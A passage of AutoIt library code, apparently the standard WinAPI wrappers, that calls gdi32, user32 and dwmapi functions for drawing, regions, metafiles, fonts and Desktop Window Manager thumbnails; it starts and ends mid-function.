		EndIf
		If $hsource Then
			_winapi_deleteobject($hsource)
		EndIf
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $ilength
	EndFunc

	Func _winapi_copyenhmetafile($hemf, $sfilepath = "")
		Local $stypeoffile = "wstr"
		If NOT StringStripWS($sfilepath, $str_stripleading + $str_striptrailing) Then
			$stypeoffile = "ptr"
			$sfilepath = 0
		EndIf
		Local $aret = DllCall("gdi32.dll", "handle", "CopyEnhMetaFileW", "handle", $hemf, $stypeoffile, $sfilepath)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_copyrect($trect)
		Local $tdata = DllStructCreate($tagrect)
		Local $aret = DllCall("user32.dll", "bool", "CopyRect", "struct*", $tdata, "struct*", $trect)
		If @error OR NOT $aret[0] Then SetError(@error + 10, @extended, 0)
		Return $tdata
	EndFunc

	Func _winapi_create32bithbitmap($hicon, $bdib = False, $bdelete = False)
		Local $hbitmap = 0
		Local $adib[2] = [0, 0]
		Local $htemp = _winapi_create32bithicon($hicon)
		If @error Then Return SetError(@error, @extended, 0)
		Local $ierror = 0
		Do
			Local $ticoninfo = DllStructCreate($tagiconinfo)
			Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $htemp, "struct*", $ticoninfo)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 10
				ExitLoop
			EndIf
			For $i = 0 To 1
				$adib[$i] = DllStructGetData($ticoninfo, $i + 4)
			Next
			Local $tbitmap = DllStructCreate($tagbitmap)
			If NOT _winapi_getobject($adib[0], DllStructGetSize($tbitmap), $tbitmap) Then
				$ierror = @error + 20
				ExitLoop
			EndIf
			If $bdib Then
				$hbitmap = _winapi_createdib(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"))
				Local $hdc = _winapi_createcompatibledc(0)
				Local $hsv = _winapi_selectobject($hdc, $hbitmap)
				_winapi_drawiconex($hdc, 0, 0, $htemp)
				_winapi_selectobject($hdc, $hsv)
				_winapi_deletedc($hdc)
			Else
				$hbitmap = $adib[1]
				$adib[1] = 0
			EndIf
		Until 1
		For $i = 0 To 1
			If $adib[$i] Then
				_winapi_deleteobject($adib[$i])
			EndIf
		Next
		_winapi_destroyicon($htemp)
		If $ierror Then Return SetError($ierror, 0, 0)
		If NOT $hbitmap Then Return SetError(12, 0, 0)
		If $bdelete Then
			_winapi_destroyicon($hicon)
		EndIf
		Return $hbitmap
	EndFunc

	Func _winapi_createbitmapindirect(ByRef $tbitmap)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateBitmapIndirect", "struct*", $tbitmap)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createbrushindirect($istyle, $irgb, $ihatch = 0)
		Local $tlogbrush = DllStructCreate($taglogbrush)
		DllStructSetData($tlogbrush, 1, $istyle)
		DllStructSetData($tlogbrush, 2, __rgb($irgb))
		DllStructSetData($tlogbrush, 3, $ihatch)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateBrushIndirect", "struct*", $tlogbrush)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createcoloradjustment($iflags = 0, $iilluminant = 0, $igammar = 10000, $igammag = 10000, $igammab = 10000, $iblack = 0, $iwhite = 10000, $icontrast = 0, $ibrightness = 0, $icolorfulness = 0, $itint = 0)
		Local $tca = DllStructCreate($tagcoloradjustment)
		DllStructSetData($tca, 1, DllStructGetSize($tca))
		DllStructSetData($tca, 2, $iflags)
		DllStructSetData($tca, 3, $iilluminant)
		DllStructSetData($tca, 4, $igammar)
		DllStructSetData($tca, 5, $igammag)
		DllStructSetData($tca, 6, $igammab)
		DllStructSetData($tca, 7, $iblack)
		DllStructSetData($tca, 8, $iwhite)
		DllStructSetData($tca, 9, $icontrast)
		DllStructSetData($tca, 10, $ibrightness)
		DllStructSetData($tca, 11, $icolorfulness)
		DllStructSetData($tca, 12, $itint)
		Return $tca
	EndFunc

	Func _winapi_createcompatiblebitmapex($hdc, $iwidth, $iheight, $irgb)
		Local $hbrush = _winapi_createbrushindirect(0, $irgb)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
		Local $hdestdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
		Local $hbmp = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
		Local $hdestsv = $aret[0]
		Local $trect = _winapi_createrectex(0, 0, $iwidth, $iheight)
		Local $ierror = 0
		$aret = DllCall("user32.dll", "int", "FillRect", "handle", $hdestdc, "struct*", $trect, "handle", $hbrush)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 10
			_winapi_deleteobject($hbmp)
		EndIf
		_winapi_deleteobject($hbrush)
		DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
		DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $hbmp
	EndFunc

	Func _winapi_createdibitmap($hdc, ByRef $tbitmapinfo, $iusage, $pbits = 0)
		Local $iinit = 0
		If $pbits Then
			$iinit = 4
		EndIf
		Local $aret = DllCall("gdi32.dll", "handle", "CreateDIBitmap", "handle", $hdc, "struct*", $tbitmapinfo, "dword", $iinit, "struct*", $pbits, "struct*", $tbitmapinfo, "uint", $iusage)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createellipticrgn($trect)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateEllipticRgnIndirect", "struct*", $trect)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_createenhmetafile($hdc = 0, $trect = 0, $bpixels = False, $sfilepath = "", $sdescription = "")
		Local $stypeoffile = "wstr"
		If NOT StringStripWS($sfilepath, $str_stripleading + $str_striptrailing) Then
			$stypeoffile = "ptr"
			$sfilepath = 0
		EndIf
		Local $tdata = 0, $adata = StringSplit($sdescription, "|", $str_nocount)
		If UBound($adata) < 2 Then
			ReDim $adata[2]
			$adata[1] = ""
		EndIf
		For $i = 0 To 1
			$adata[$i] = StringStripWS($adata[$i], $str_stripleading + $str_striptrailing)
		Next
		If ($adata[0]) OR ($adata[1]) Then
			$tdata = _winapi_arraytostruct($adata)
		EndIf
		Local $ixp, $iyp, $ixm, $iym, $href = 0
		If $bpixels AND (IsDllStruct($trect)) Then
			If NOT $hdc Then
				$href = _winapi_getdc(0)
			EndIf
			$ixp = _winapi_getdevicecaps($href, 8)
			$iyp = _winapi_getdevicecaps($href, 10)
			$ixm = _winapi_getdevicecaps($href, 4)
			$iym = _winapi_getdevicecaps($href, 6)
			If $href Then
				_winapi_releasedc(0, $href)
			EndIf
			For $i = 1 To 3 Step 2
				DllStructSetData($trect, $i, Round(DllStructGetData($trect, $i) * $ixm / $ixp * 100))
			Next
			For $i = 2 To 4 Step 2
				DllStructSetData($trect, $i, Round(DllStructGetData($trect, $i) * $iym / $iyp * 100))
			Next
		EndIf
		Local $aret = DllCall("gdi32.dll", "handle", "CreateEnhMetaFileW", "handle", $hdc, $stypeoffile, $sfilepath, "struct*", $trect, "struct*", $tdata)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createfontex($iheight, $iwidth = 0, $iescapement = 0, $iorientation = 0, $iweight = 400, $bitalic = False, $bunderline = False, $bstrikeout = False, $icharset = 1, $ioutprecision = 0, $iclipprecision = 0, $iquality = 0, $ipitchandfamily = 0, $sfacename = "", $istyle = 0)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescapement, "int", $iorientation, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutprecision, "dword", $iclipprecision, "dword", $iquality, "dword", $ipitchandfamily, "wstr", _winapi_getfontname($sfacename, $istyle, $icharset))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createnullrgn()
		Local $aret = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", 0, "int", 0, "int", 0, "int", 0)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createpen($ipenstyle, $iwidth, $icolor)
		Local $aresult = DllCall("gdi32.dll", "handle", "CreatePen", "int", $ipenstyle, "int", $iwidth, "INT", $icolor)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_createpolygonrgn(Const ByRef $apoint, $istart = 0, $iend = -1, $imode = 1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2, 2) Then Return SetError(@error + 10, @extended, 0)
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "int[2];"
		Next
		Local $tdata = DllStructCreate($tagstruct)
		Local $icount = 1
		For $i = $istart To $iend
			For $j = 0 To 1
				DllStructSetData($tdata, $icount, $apoint[$i][$j], $j + 1)
			Next
			$icount += 1
		Next
		Local $aret = DllCall("gdi32.dll", "handle", "CreatePolygonRgn", "struct*", $tdata, "int", $icount - 1, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createrectrgnindirect($trect)
		Local $aret = DllCall("gdi32.dll", "handle", "CreateRectRgnIndirect", "struct*", $trect)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createsolidbitmap($hwnd, $icolor, $iwidth, $iheight, $brgb = 1)
		Local $hdc = _winapi_getdc($hwnd)
		Local $hdestdc = _winapi_createcompatibledc($hdc)
		Local $hbitmap = _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
		Local $hold = _winapi_selectobject($hdestdc, $hbitmap)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, 0)
		DllStructSetData($trect, 2, 0)
		DllStructSetData($trect, 3, $iwidth)
		DllStructSetData($trect, 4, $iheight)
		If $brgb Then
			$icolor = BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
		EndIf
		Local $hbrush = _winapi_createsolidbrush($icolor)
		If NOT _winapi_fillrect($hdestdc, $trect, $hbrush) Then
			_winapi_deleteobject($hbitmap)
			$hbitmap = 0
		EndIf
		_winapi_deleteobject($hbrush)
		_winapi_releasedc($hwnd, $hdc)
		_winapi_selectobject($hdestdc, $hold)
		_winapi_deletedc($hdestdc)
		If NOT $hbitmap Then Return SetError(1, 0, 0)
		Return $hbitmap
	EndFunc

	Func _winapi_createtransform($nm11 = 1, $nm12 = 0, $nm21 = 0, $nm22 = 1, $ndx = 0, $ndy = 0)
		Local $txform = DllStructCreate($tagxform)
		DllStructSetData($txform, 1, $nm11)
		DllStructSetData($txform, 2, $nm12)
		DllStructSetData($txform, 3, $nm21)
		DllStructSetData($txform, 4, $nm22)
		DllStructSetData($txform, 5, $ndx)
		DllStructSetData($txform, 6, $ndy)
		Return $txform
	EndFunc

	Func _winapi_deleteenhmetafile($hemf)
		Local $aret = DllCall("gdi32.dll", "bool", "DeleteEnhMetaFile", "handle", $hemf)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_dptolp($hdc, ByRef $tpoint, $icount = 1)
		Local $aret = DllCall("gdi32.dll", "bool", "DPtoLP", "handle", $hdc, "struct*", $tpoint, "int", $icount)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_drawanimatedrects($hwnd, $trectfrom, $trectto)
		Local $aret = DllCall("user32.dll", "bool", "DrawAnimatedRects", "hwnd", $hwnd, "int", 3, "struct*", $trectfrom, "struct*", $trectto)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_drawbitmap($hdc, $ix, $iy, $hbitmap, $irop = 13369376)
		Local $tobj = DllStructCreate($tagbitmap)
		Local $aret = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
		If @error OR NOT $aret[0] Then Return SetError(@error + 20, @extended, 0)
		$aret = DllCall("user32.dll", "handle", "GetDC", "hwnd", 0)
		Local $_hdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $_hdc)
		Local $hsrcdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
		Local $hsrcsv = $aret[0]
		Local $ierror = 0
		$aret = DllCall("gdi32.dll", "int", "BitBlt", "hwnd", $hdc, "int", $ix, "int", $iy, "int", DllStructGetData($tobj, "bmWidth"), "int", DllStructGetData($tobj, "bmHeight"), "hwnd", $hsrcdc, "int", 0, "int", 0, "int", $irop)
		If @error OR NOT $aret[0] Then
			$ierror = @error + 1
		EndIf
		DllCall("user32.dll", "int", "ReleaseDC", "hwnd", 0, "handle", $_hdc)
		DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
		DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
		If $ierror Then Return SetError(10, 0, 0)
		Return 1
	EndFunc

	Func _winapi_drawfocusrect($hdc, $trect)
		Local $aret = DllCall("user32.dll", "bool", "DrawFocusRect", "handle", $hdc, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_drawline($hdc, $ix1, $iy1, $ix2, $iy2)
		_winapi_moveto($hdc, $ix1, $iy1)
		If @error Then Return SetError(@error, @extended, False)
		_winapi_lineto($hdc, $ix2, $iy2)
		If @error Then Return SetError(@error + 10, @extended, False)
		Return True
	EndFunc

	Func _winapi_drawshadowtext($hdc, $stext, $irgbtext, $irgbshadow, $ixoffset = 0, $iyoffset = 0, $trect = 0, $iflags = 0)
		Local $aret
		If NOT IsDllStruct($trect) Then
			$trect = DllStructCreate($tagrect)
			$aret = DllCall("user32.dll", "bool", "GetClientRect", "hwnd", _winapi_windowfromdc($hdc), "struct*", $trect)
			If @error Then Return SetError(@error + 10, @extended, 0)
			If NOT $aret[0] Then Return SetError(10, 0, 0)
		EndIf
		$aret = DllCall("comctl32.dll", "int", "DrawShadowText", "handle", $hdc, "wstr", $stext, "uint", -1, "struct*", $trect, "dword", $iflags, "int", __rgb($irgbtext), "int", __rgb($irgbshadow), "int", $ixoffset, "int", $iyoffset)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_dwmdefwindowproc($hwnd, $imsg, $wparam, $lparam)
		Local $aret = DllCall("dwmapi.dll", "bool", "DwmDefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam, "lresult*", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $aret[5]
	EndFunc

	Func _winapi_dwmenableblurbehindwindow($hwnd, $benable = True, $btransition = False, $hrgn = 0)
		Local $tblurbehind = DllStructCreate("dword;bool;handle;bool")
		Local $iflags = 0
		If $hrgn Then
			$iflags += 2
			DllStructSetData($tblurbehind, 3, $hrgn)
		EndIf
		DllStructSetData($tblurbehind, 1, BitOR($iflags, 5))
		DllStructSetData($tblurbehind, 2, $benable)
		DllStructSetData($tblurbehind, 4, $btransition)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmEnableBlurBehindWindow", "hwnd", $hwnd, "struct*", $tblurbehind)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmenablecomposition($benable)
		If $benable Then $benable = 1
		Local $aret = DllCall("dwmapi.dll", "long", "DwmEnableComposition", "uint", $benable)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmextendframeintoclientarea($hwnd, $tmargins = 0)
		If NOT IsDllStruct($tmargins) Then
			$tmargins = _winapi_createmargins(-1, -1, -1, -1)
		EndIf
		Local $aret = DllCall("dwmapi.dll", "long", "DwmExtendFrameIntoClientArea", "hwnd", $hwnd, "struct*", $tmargins)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmgetcolorizationcolor()
		Local $aret = DllCall("dwmapi.dll", "long", "DwmGetColorizationColor", "dword*", 0, "bool*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return SetExtended($aret[2], $aret[1])
	EndFunc

	Func _winapi_dwmgetcolorizationparameters()
		Local $tdwmcp = DllStructCreate($tagdwm_colorization_parameters)
		Local $aret = DllCall("dwmapi.dll", "uint", 127, "struct*", $tdwmcp)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $tdwmcp
	EndFunc

	Func _winapi_dwmgetwindowattribute($hwnd, $iattribute)
		Local $tagstruct
		Switch $iattribute
			Case 5, 9
				$tagstruct = $tagrect
			Case 1
				$tagstruct = "uint"
			Case Else
				Return SetError(11, 0, 0)
		EndSwitch
		Local $tdata = DllStructCreate($tagstruct)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmGetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "struct*", $tdata, "dword", DllStructGetSize($tdata))
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Switch $iattribute
			Case 1
				Return DllStructGetData($tdata, 1)
			Case Else
				Return $tdata
		EndSwitch
	EndFunc

	Func _winapi_dwminvalidateiconicbitmaps($hwnd)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmInvalidateIconicBitmaps", "hwnd", $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmiscompositionenabled()
		Local $aret = DllCall("dwmapi.dll", "long", "DwmIsCompositionEnabled", "bool*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $aret[1]
	EndFunc

	Func _winapi_dwmquerythumbnailsourcesize($hthumbnail)
		Local $tsize = DllStructCreate($tagsize)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmQueryThumbnailSourceSize", "handle", $hthumbnail, "struct*", $tsize)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $tsize
	EndFunc

	Func _winapi_dwmregisterthumbnail($hdestination, $hsource)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmRegisterThumbnail", "hwnd", $hdestination, "hwnd", $hsource, "handle*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $aret[3]
	EndFunc

	Func _winapi_dwmsetcolorizationparameters($tdwmcp)
		Local $aret = DllCall("dwmapi.dll", "uint", 131, "struct*", $tdwmcp, "uint", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmseticoniclivepreviewbitmap($hwnd, $hbitmap, $bframe = False, $tclient = 0)
		Local $iflags
		If $bframe Then
			$iflags = 1
		Else
			$iflags = 0
		EndIf
		Local $aret = DllCall("dwmapi.dll", "uint", "DwmSetIconicLivePreviewBitmap", "hwnd", $hwnd, "handle", $hbitmap, "struct*", $tclient, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmseticonicthumbnail($hwnd, $hbitmap, $bframe = False)
		Local $iflags
		If $bframe Then
			$iflags = 1
		Else
			$iflags = 0
		EndIf
		Local $aret = DllCall("dwmapi.dll", "long", "DwmSetIconicThumbnail", "hwnd", $hwnd, "handle", $hbitmap, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmsetwindowattribute($hwnd, $iattribute, $idata)
		Switch $iattribute
			Case 2, 3, 4, 6, 7, 8, 10, 11, 12
			Case Else
				Return SetError(1, 0, 0)
		EndSwitch
		Local $aret = DllCall("dwmapi.dll", "long", "DwmSetWindowAttribute", "hwnd", $hwnd, "dword", $iattribute, "dword*", $idata, "dword", 4)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmunregisterthumbnail($hthumbnail)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmUnregisterThumbnail", "handle", $hthumbnail)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_dwmupdatethumbnailproperties($hthumbnail, $bvisible = True, $bclientareaonly = False, $iopacity = 255, $trectdest = 0, $trectsrc = 0)
		Local Const $tagdwm_thumbnail_properties = "struct;dword dwFlags;int rcDestination[4];int rcSource[4];byte opacity;bool opacity;bool fSourceClientAreaOnly;endstruct"
		Local $tthumbnailproperties = DllStructCreate($tagdwm_thumbnail_properties)
		Local $tsize, $iflags = 0
		If NOT IsDllStruct($trectdest) Then
			$tsize = _winapi_dwmquerythumbnailsourcesize($hthumbnail)
			If @error Then
				Return SetError(@error + 10, @extended, 0)
			EndIf
			$trectdest = _winapi_createrectex(0, 0, DllStructGetData($tsize, 1), DllStructGetData($tsize, 2))
		EndIf
		For $i = 1 To 4
			DllStructSetData($tthumbnailproperties, 2, DllStructGetData($trectdest, $i), $i)
		Next
		If IsDllStruct($trectsrc) Then
			$iflags += 2
			For $i = 1 To 4
				DllStructSetData($tthumbnailproperties, 3, DllStructGetData($trectsrc, $i), $i)
			Next
		EndIf
		DllStructSetData($tthumbnailproperties, 1, BitOR($iflags, 29))
		DllStructSetData($tthumbnailproperties, 4, $iopacity)
		DllStructSetData($tthumbnailproperties, 5, $bvisible)
		DllStructSetData($tthumbnailproperties, 6, $bclientareaonly)
		Local $aret = DllCall("dwmapi.dll", "long", "DwmUpdateThumbnailProperties", "handle", $hthumbnail, "struct*", $tthumbnailproperties)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return 1
	EndFunc

	Func _winapi_ellipse($hdc, $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "Ellipse", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4))
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_endpaint($hwnd, ByRef $tpaintstruct)
		Local $aret = DllCall("user32.dll", "bool", "EndPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_endpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "EndPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_enumdisplaymonitors($hdc = 0, $trect = 0)
		Local $henumproc = DllCallbackRegister("__EnumDisplayMonitorsProc", "bool", "handle;handle;ptr;lparam")
		Dim $__g_venum[101][2] = [[0]]
		Local $aret = DllCall("user32.dll", "bool", "EnumDisplayMonitors", "handle", $hdc, "struct*", $trect, "ptr", DllCallbackGetPtr($henumproc), "lparam", 0)
		If @error OR NOT $aret[0] OR NOT $__g_venum[0][0] Then
			$__g_venum = @error + 10
		EndIf
		DllCallbackFree($henumproc)
		If $__g_venum Then Return SetError($__g_venum, 0, 0)
		__inc($__g_venum, -1)
		Return $__g_venum
	EndFunc

	Func _winapi_enumdisplaysettings($sdevice, $imode)
		Local $stypeofdevice = "wstr"
		If NOT StringStripWS($sdevice, $str_stripleading + $str_striptrailing) Then
			$stypeofdevice = "ptr"
			$sdevice = 0
		EndIf
		Local $tdevmode = DllStructCreate($tagdevmode_display)
		DllStructSetData($tdevmode, "Size", DllStructGetSize($tdevmode))
		DllStructSetData($tdevmode, "DriverExtra", 0)
		Local $aret = DllCall("user32.dll", "bool", "EnumDisplaySettingsW", $stypeofdevice, $sdevice, "dword", $imode, "struct*", $tdevmode)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[5]
		$aresult[0] = DllStructGetData($tdevmode, "PelsWidth")
		$aresult[1] = DllStructGetData($tdevmode, "PelsHeight")
		$aresult[2] = DllStructGetData($tdevmode, "BitsPerPel")
		$aresult[3] = DllStructGetData($tdevmode, "DisplayFrequency")
		$aresult[4] = DllStructGetData($tdevmode, "DisplayFlags")
		Return $aresult
	EndFunc

	Func _winapi_enumfontfamilies($hdc = 0, $sfacename = "", $icharset = 1, $ifonttype = 7, $spattern = "", $bexclude = False)
		Local $tlogfont = DllStructCreate($taglogfont)
		Local $tpattern = DllStructCreate("uint;uint;ptr;wchar[" & (StringLen($spattern) + 1) & "]")
		DllStructSetData($tpattern, 1, $ifonttype)
		If NOT $spattern Then
			DllStructSetData($tpattern, 2, 0)
			DllStructSetData($tpattern, 3, 0)
		Else
			DllStructSetData($tpattern, 2, $bexclude)
			DllStructSetData($tpattern, 3, DllStructGetPtr($tpattern, 4))
			DllStructSetData($tpattern, 4, $spattern)
		EndIf
		DllStructSetData($tlogfont, 9, $icharset)
		DllStructSetData($tlogfont, 13, 0)
		DllStructSetData($tlogfont, 14, StringLeft($sfacename, 31))
		Local $hcdc
		If NOT $hdc Then
			$hcdc = _winapi_createcompatibledc(0)
		Else
			$hcdc = $hdc
		EndIf
		Dim $__g_venum[101][8] = [[0]]
		Local $henumproc = DllCallbackRegister("__EnumFontFamiliesProc", "int", "ptr;ptr;dword;PTR")
		Local $aret = DllCall("gdi32.dll", "int", "EnumFontFamiliesExW", "handle", $hcdc, "struct*", $tlogfont, "ptr", DllCallbackGetPtr($henumproc), "struct*", $tpattern, "dword", 0)
		If @error OR NOT $aret[0] OR NOT $__g_venum[0][0] Then
			$__g_venum = @error + 10
		EndIf
		DllCallbackFree($henumproc)
		If NOT $hdc Then
			_winapi_deletedc($hcdc)
		EndIf
		If $__g_venum Then Return SetError($__g_venum, 0, 0)
		__inc($__g_venum, -1)
		Return $__g_venum
	EndFunc

	Func _winapi_equalrect($trect1, $trect2)
		Local $aret = DllCall("user32.dll", "bool", "EqualRect", "struct*", $trect1, "struct*", $trect2)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_equalrgn($hrgn1, $hrgn2)
		Local $aret = DllCall("gdi32.dll", "bool", "EqualRgn", "handle", $hrgn1, "handle", $hrgn2)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_excludecliprect($hdc, $trect)
		Local $aret = DllCall("gdi32.dll", "int", "ExcludeClipRect", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_extcreatepen($ipenstyle, $iwidth, $ibrushstyle, $irgb, $ihatch = 0, $auserstyle = 0, $istart = 0, $iend = -1)
		Local $icount = 0, $tstyle = 0
		If BitAND($ipenstyle, 255) = 7 Then
			If __checkerrorarraybounds($auserstyle, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
			$tstyle = DllStructCreate("dword[" & ($iend - $istart + 1) & "]")
			For $i = $istart To $iend
				DllStructSetData($tstyle, 1, $auserstyle[$i], $icount + 1)
				$icount += 1
			Next
		EndIf
		Local $tlogbrush = DllStructCreate($taglogbrush)
		DllStructSetData($tlogbrush, 1, $ibrushstyle)
		DllStructSetData($tlogbrush, 2, __rgb($irgb))
		DllStructSetData($tlogbrush, 3, $ihatch)
		Local $aret = DllCall("gdi32.dll", "handle", "ExtCreatePen", "dword", $ipenstyle, "dword", $iwidth, "struct*", $tlogbrush, "dword", $icount, "struct*", $tstyle)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_extcreateregion($trgndata, $txform = 0)
		Local $aret = DllCall("gdi32.dll", "handle", "ExtCreateRegion", "struct*", $txform, "dword", DllStructGetSize($trgndata), "struct*", $trgndata)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_extfloodfill($hdc, $ix, $iy, $irgb, $itype = 0)
		Local $aret = DllCall("gdi32.dll", "bool", "ExtFloodFill", "handle", $hdc, "int", $ix, "int", $iy, "dword", __rgb($irgb), "uint", $itype)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_extselectcliprgn($hdc, $hrgn, $imode = 5)
		Local $aret = DllCall("gdi32.dll", "int", "ExtSelectClipRgn", "handle", $hdc, "handle", $hrgn, "int", $imode)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_fillpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "FillPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_fillrgn($hdc, $hrgn, $hbrush)
		Local $aret = DllCall("gdi32.dll", "bool", "FillRgn", "handle", $hdc, "handle", $hrgn, "handle", $hbrush)
